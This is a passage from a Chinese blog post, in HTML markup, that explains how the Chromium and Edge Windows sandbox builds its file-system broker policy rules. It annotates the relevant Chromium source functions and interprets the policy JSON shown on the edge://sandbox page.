file,</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">uint32_t</span> attributes,</span></span></span><br><span class="line"><span class="function"><span class="params">      FILE_NETWORK_OPEN_INFORMATION* file_info,</span></span></span><br><span class="line"><span class="function"><span class="params">      NTSTATUS* nt_status)</span></span>;</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// // IPC收到的set_info 请求时的操作</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">SetInformationFileAction</span><span class="params">(EvalResult eval_result,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       <span class="keyword">const</span> ClientInfo&amp; client_info,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       HANDLE target_file_handle,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       <span class="keyword">void</span>* file_info,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       <span class="keyword">uint32_t</span> length,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       <span class="keyword">uint32_t</span> info_class,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       IO_STATUS_BLOCK* io_block,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       NTSTATUS* nt_status)</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>chrome的Windows版Sandbox是利用系统的</p><ul><li><p>user32!CreateDesktopW</p></li><li><p>kernel32!CreateJobObjectW</p></li><li><p>advapi32!CreateRestrictedToken</p></li><li><p>advapi32!CreateProcessAsUserW</p></li><li><p>advapi32!SetThreadToken</p></li><li><p>advapi32!RevertToSelf</p></li></ul><p>这些API为每个网页单独建立一个权限受限的renderer子进程专门用来解析网页, 如果网页有什么越轨的行为就销毁这个renderer子进程. 因为renderer子进程权限太低无法进行诸如下载上传文件这些操作, chrome改写了renderer子进程10个API, 如果参数合乎policy要求就让正常权限的browser主进程代为完成。</p><ul><li><p>ntdll!NtCreateFile</p></li><li><p>ntdll!NtOpenFile</p></li><li><p>ntdll!NtQueryAttributesFile</p></li><li><p>ntdll!NtQueryFullAttributesFile</p></li><li><p>ntdll!NtSetInformationFile</p></li><li><p>ntdll!NtOpenThread</p></li><li><p>ntdll!NtOpenProcess</p></li><li><p>ntdll!NtOpenProcessToken</p></li><li><p>ntdll!NtSetInformationThread</p></li><li><p>ntdll!NtOpenThreadToken</p></li></ul><h2 id="FileSystemPolicy-GenerateRules"><a href="#FileSystemPolicy-GenerateRules" class="headerlink" title="FileSystemPolicy::GenerateRules"></a>FileSystemPolicy::GenerateRules</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//chromium/sandbox/win/src/filesystem_policy.cc</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">FileSystemPolicy::GenerateRules</span><span class="params">(<span class="keyword">const</span> <span class="keyword">wchar_t</span>* name,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     TargetPolicy::Semantics semantics,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     LowLevelPolicy* policy)</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="built_in">std</span>::<span class="built_in">wstring</span> <span class="title">mod_name</span><span class="params">(name)</span></span>;</span><br><span class="line">  <span class="keyword">if</span> (mod_name.empty()) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//处理 mod_name。</span></span><br><span class="line">  <span class="keyword">if</span> (!PreProcessName(&amp;mod_name)) &#123;</span><br><span class="line">    <span class="comment">// The path to be added might contain a reparse point.</span></span><br><span class="line">    NOTREACHED();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// TODO(cpu) bug 32224: This prefix add is a hack because we don&#x27;t have the</span></span><br><span class="line">  <span class="comment">// infrastructure to normalize names. In any case we need to escape the</span></span><br><span class="line">  <span class="comment">// question marks.</span></span><br><span class="line">  <span class="keyword">if</span> (_wcsnicmp(mod_name.c_str(), kNTDevicePrefix, kNTDevicePrefixLen)) &#123;</span><br><span class="line">    mod_name = FixNTPrefixForMatch(mod_name);</span><br><span class="line">    name = mod_name.c_str();</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 设定 ASK_broker</span></span><br><span class="line">  EvalResult result = ASK_BROKER;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// List of supported calls for the filesystem.</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">unsigned</span> kCallNtCreateFile = <span class="number">0x1</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">unsigned</span> kCallNtOpenFile = <span class="number">0x2</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">unsigned</span> kCallNtQueryAttributesFile = <span class="number">0x4</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">unsigned</span> kCallNtQueryFullAttributesFile = <span class="number">0x8</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">unsigned</span> kCallNtSetInfoRename = <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">  DWORD rule_to_add = kCallNtOpenFile | kCallNtCreateFile |</span><br><span class="line">                      kCallNtQueryAttributesFile |</span><br><span class="line">                      kCallNtQueryFullAttributesFile | kCallNtSetInfoRename;</span><br><span class="line">  <span class="comment">//创建 5 个PolicyRule，分别管制5种请求，action为ASK_BROKER</span></span><br><span class="line">  <span class="function">PolicyRule <span class="title">create</span><span class="params">(result)</span></span>;</span><br><span class="line">  <span class="function">PolicyRule <span class="title">open</span><span class="params">(result)</span></span>;</span><br><span class="line">  <span class="function">PolicyRule <span class="title">query</span><span class="params">(result)</span></span>;</span><br><span class="line">  <span class="function">PolicyRule <span class="title">query_full</span><span class="params">(result)</span></span>;</span><br><span class="line">  <span class="function">PolicyRule <span class="title">rename</span><span class="params">(result)</span></span>;</span><br><span class="line">  <span class="comment">//根据不同的semantics，添加不同的 policy</span></span><br><span class="line">  <span class="keyword">switch</span> (semantics) &#123;</span><br><span class="line">    <span class="keyword">case</span> TargetPolicy::FILES_ALLOW_DIR_ANY: &#123;</span><br><span class="line">      open.AddNumberMatch(IF, OpenFile::OPTIONS, FILE_DIRECTORY_FILE, AND);</span><br><span class="line">      create.AddNumberMatch(IF, OpenFile::OPTIONS, FILE_DIRECTORY_FILE, AND);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> TargetPolicy::FILES_ALLOW_READONLY: &#123;</span><br><span class="line">      <span class="comment">// We consider all flags that are not known to be readonly as potentially</span></span><br><span class="line">      <span class="comment">// used for write.</span></span><br><span class="line">      DWORD allowed_flags = FILE_READ_DATA | FILE_READ_ATTRIBUTES |</span><br><span class="line">                            FILE_READ_EA | SYNCHRONIZE | FILE_EXECUTE |</span><br><span class="line">                            GENERIC_READ | GENERIC_EXECUTE | READ_CONTROL;</span><br><span class="line">      DWORD restricted_flags = ~allowed_flags;</span><br><span class="line">      open.AddNumberMatch(IF_NOT, OpenFile::ACCESS, restricted_flags, AND);</span><br><span class="line">      open.AddNumberMatch(IF, OpenFile::DISPOSITION, FILE_OPEN, EQUAL);</span><br><span class="line">      create.AddNumberMatch(IF_NOT, OpenFile::ACCESS, restricted_flags, AND);</span><br><span class="line">      create.AddNumberMatch(IF, OpenFile::DISPOSITION, FILE_OPEN, EQUAL);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Read only access don&#x27;t work for rename.</span></span><br><span class="line">      rule_to_add &amp;= ~kCallNtSetInfoRename;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> TargetPolicy::FILES_ALLOW_QUERY: &#123;</span><br><span class="line">      <span class="comment">// Here we don&#x27;t want to add policy for the open or the create.</span></span><br><span class="line">      rule_to_add &amp;=</span><br><span class="line">          ~(kCallNtOpenFile | kCallNtCreateFile | kCallNtSetInfoRename);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> TargetPolicy::FILES_ALLOW_ANY: &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">default</span>: &#123;</span><br><span class="line">      NOTREACHED();</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 根据当前rule_to_add的状态，把OpenFile::NAME这一参数进行设置</span></span><br><span class="line">  <span class="comment">// PolicyRule add好以后，就通过policy-&gt;AddRule添加到LowLevelPolicy中</span></span><br><span class="line">  <span class="comment">// 注意AddRule时会绑定service id和PolicyRule</span></span><br><span class="line">  <span class="comment">// filesystem子系统占用了5个service id，分别对应open, create, rename, query, queryFull</span></span><br><span class="line">  <span class="keyword">if</span> ((rule_to_add &amp; kCallNtCreateFile) &amp;&amp;</span><br><span class="line">      (!create.AddStringMatch(IF, OpenFile::NAME, name, CASE_INSENSITIVE) ||</span><br><span class="line">       !policy-&gt;AddRule(IpcTag::NTCREATEFILE, &amp;create))) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((rule_to_add &amp; kCallNtOpenFile) &amp;&amp;</span><br><span class="line">      (!open.AddStringMatch(IF, OpenFile::NAME, name, CASE_INSENSITIVE) ||</span><br><span class="line">       !policy-&gt;AddRule(IpcTag::NTOPENFILE, &amp;open))) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((rule_to_add &amp; kCallNtQueryAttributesFile) &amp;&amp;</span><br><span class="line">      (!query.AddStringMatch(IF, FileName::NAME, name, CASE_INSENSITIVE) ||</span><br><span class="line">       !policy-&gt;AddRule(IpcTag::NTQUERYATTRIBUTESFILE, &amp;query))) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((rule_to_add &amp; kCallNtQueryFullAttributesFile) &amp;&amp;</span><br><span class="line">      (!query_full.AddStringMatch(IF, FileName::NAME, name, CASE_INSENSITIVE) ||</span><br><span class="line">       !policy-&gt;AddRule(IpcTag::NTQUERYFULLATTRIBUTESFILE, &amp;query_full))) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((rule_to_add &amp; kCallNtSetInfoRename) &amp;&amp;</span><br><span class="line">      (!rename.AddStringMatch(IF, FileName::NAME, name, CASE_INSENSITIVE) ||</span><br><span class="line">       !policy-&gt;AddRule(IpcTag::NTSETINFO_RENAME, &amp;rename))) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以下是调用的实例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//chromium/sandbox/win/src/sandbox_policy_base.cc</span></span><br><span class="line"><span class="function">ResultCode <span class="title">PolicyBase::AddRuleInternal</span><span class="params">(SubSystem subsystem,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       Semantics semantics,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       <span class="keyword">const</span> <span class="keyword">wchar_t</span>* pattern)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!policy_) &#123;</span><br><span class="line">     <span class="comment">// 如果policy_未被设置，make一个4096*14尺寸的PolicyGlobal</span></span><br><span class="line">    policy_ = MakeBrokerPolicyMemory();</span><br><span class="line">    DCHECK(policy_);</span><br><span class="line">     <span class="comment">// 使用该PolicyGlobal new出一个LowLevelPolicy</span></span><br><span class="line">    policy_maker_ = <span class="keyword">new</span> LowLevelPolicy(policy_);</span><br><span class="line">    DCHECK(policy_maker_);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (subsystem) &#123;</span><br><span class="line">    <span class="keyword">case</span> SUBSYS_FILES: &#123;</span><br><span class="line">      <span class="keyword">if</span> (!file_system_init_) &#123; <span class="comment">//确定 filesystem 被初始化，一开始file_system_init_是false</span></span><br><span class="line">        <span class="keyword">if</span> (!FileSystemPolicy::SetInitialRules(policy_maker_))</span><br><span class="line">            <span class="comment">// 执行完SetInitialRules后，file_system_init_置true，即SetInitialRules只执行一次</span></span><br><span class="line">          <span class="keyword">return</span> SBOX_ERROR_BAD_PARAMS;</span><br><span class="line">        file_system_init_ = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">        <span class="comment">// 根据传入的pattern,semantics，用LowLevelPolicy生成一个rule</span></span><br><span class="line">      <span class="keyword">if</span> (!FileSystemPolicy::GenerateRules(pattern, semantics, policy_maker_)) &#123;</span><br><span class="line">        NOTREACHED();</span><br><span class="line">        <span class="keyword">return</span> SBOX_ERROR_BAD_PARAMS;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> SBOX_ALL_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="FileSystemPolicy-SetInitialRules"><a href="#FileSystemPolicy-SetInitialRules" class="headerlink" title="FileSystemPolicy::SetInitialRules()"></a>FileSystemPolicy::SetInitialRules()</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">FileSystemPolicy::SetInitialRules</span><span class="params">(LowLevelPolicy* policy)</span> </span>&#123;</span><br><span class="line">  <span class="function">PolicyRule <span class="title">format</span><span class="params">(ASK_BROKER)</span></span>;</span><br><span class="line">  <span class="function">PolicyRule <span class="title">short_name</span><span class="params">(ASK_BROKER)</span></span>;</span><br><span class="line">  <span class="comment">// 两个ASK_BROKER的action rule</span></span><br><span class="line">    </span><br><span class="line">  <span class="keyword">bool</span> rv = format.AddNumberMatch(IF_NOT, FileName::BROKER, BROKER_TRUE, AND);</span><br><span class="line">  rv &amp;= format.AddStringMatch(IF_NOT, FileName::NAME, <span class="string">L&quot;\\/?/?\\*&quot;</span>,</span><br><span class="line">                              CASE_SENSITIVE);</span><br><span class="line">  <span class="comment">// format按位与匹配FileName::BROKER没有BROKER_TRUE标志位</span></span><br><span class="line">  rv &amp;= short_name.AddNumberMatch(IF_NOT, FileName::BROKER, BROKER_TRUE, AND);</span><br><span class="line">  <span class="comment">// 匹配FileName::NAME不能为L&quot;\\/?/?\\*&quot;</span></span><br><span class="line">  rv &amp;= short_name.AddStringMatch(IF, FileName::NAME, <span class="string">L&quot;*~*&quot;</span>, CASE_SENSITIVE);</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// 为5个service id，各添加这两个rule到LowLevelPolicy</span></span><br><span class="line">  <span class="keyword">if</span> (!rv || !policy-&gt;AddRule(IpcTag::NTCREATEFILE, &amp;format))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!policy-&gt;AddRule(IpcTag::NTCREATEFILE, &amp;short_name))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!policy-&gt;AddRule(IpcTag::NTOPENFILE, &amp;format))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!policy-&gt;AddRule(IpcTag::NTOPENFILE, &amp;short_name))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!policy-&gt;AddRule(IpcTag::NTQUERYATTRIBUTESFILE, &amp;format))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!policy-&gt;AddRule(IpcTag::NTQUERYATTRIBUTESFILE, &amp;short_name))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!policy-&gt;AddRule(IpcTag::NTQUERYFULLATTRIBUTESFILE, &amp;format))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!policy-&gt;AddRule(IpcTag::NTQUERYFULLATTRIBUTESFILE, &amp;short_name))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!policy-&gt;AddRule(IpcTag::NTSETINFO_RENAME, &amp;format))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!policy-&gt;AddRule(IpcTag::NTSETINFO_RENAME, &amp;short_name))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个初始化函数为 low-level policy 定制一了一套初级的策略。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><strong>FileSystem的low-level policy部分做了两件事：</strong></p><ul><li>为<code>PolicyBase::AddRule</code>提供了该子系统5个service或者叫action的Rule制定接口。</li><li>编写了broker端5个(create, open, rename, query, queryFull)请求的处理，在broker端调用了对应的API函数。</li></ul><h1 id="edge-sandbox"><a href="#edge-sandbox" class="headerlink" title="edge://sandbox"></a>edge://sandbox</h1><p>当我们在 edge 输入 edge://sandbox 会返回如下界面</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210802183113.png" alt="image-20210728192811294"></p><p>粗略的看，里面包含一个活动进程表(不包括浏览器进程，因为它没有被沙箱化)和一些摘要信息，然后和每个进程的详细沙箱配置的原始数据转储成的 JSON 序列。关于像 <code>NtCreateFile</code>这些<code>service</code>的 policy 是如何设置的在上文已经进行过解读，下文主要分析一下这个页面是什么含义。</p><p>以以下序列为例，进行解读。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;desiredIntegrityLevel&quot;</span>: <span class="string">&quot;S-1-16-4096 Low&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;desiredMitigations&quot;</span>: <span class="string">&quot;0000000000af1267&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;disconnectCsrss&quot;</span>: <span class="string">&quot;disabled&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;jobLevel&quot;</span>: <span class="string">&quot;Limited User&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;lockdownLevel&quot;</span>: <span class="string">&quot;Limited&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;platformMitigations&quot;</span>: <span class="string">&quot;01111001000110000000000000010000&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;policyRules&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;CreateNamedPipeW&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\\\.\\pipe\\LOCAL\\chrome.sync.&#x27;) -&gt; askBroker&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;NtCreateFile&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; !(prefix(p[0], &#x27;\\??\\&#x27;)) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; scan(p[0], &#x27;~&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\chrome.&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\LOCAL\\chrome.&#x27;) -&gt; askBroker&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;NtOpenFile&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; !(prefix(p[0], &#x27;\\??\\&#x27;)) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; scan(p[0], &#x27;~&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\chrome.&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\LOCAL\\chrome.&#x27;) -&gt; askBroker&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;NtQueryAttributesFile&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; !(prefix(p[0], &#x27;\\??\\&#x27;)) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; scan(p[0], &#x27;~&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\chrome.&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\LOCAL\\chrome.&#x27;) -&gt; askBroker&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;NtQueryFullAttributesFile&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; !(prefix(p[0], &#x27;\\??\\&#x27;)) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; scan(p[0], &#x27;~&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\chrome.&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\LOCAL\\chrome.&#x27;) -&gt; askBroker&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;NtSetInfoRename&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; !(prefix(p[0], &#x27;\\??\\&#x27;)) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; scan(p[0], &#x27;~&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\chrome.&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\LOCAL\\chrome.&#x27;) -&gt; askBroker&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;processIds&quot;</span>: [</span><br><span class="line">      <span class="number">4888</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>关于<code>Mitigations</code>我们可以使用 google 提供的解码器进行解码：<a href="https://docs.google.com/a/chromium.org/viewer?a=v&amp;pid=sites&amp;srcid=Y2hyb21pdW0ub3JnfGRldnxneDo3MDg0MDMzODNjODgzMDMy">https://docs.google.com/a/chromium.org/viewer?a=v&amp;pid=sites&amp;srcid=Y2hyb21pdW0ub3JnfGRldnxneDo3MDg0MDMzODNjODgzMDMy</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 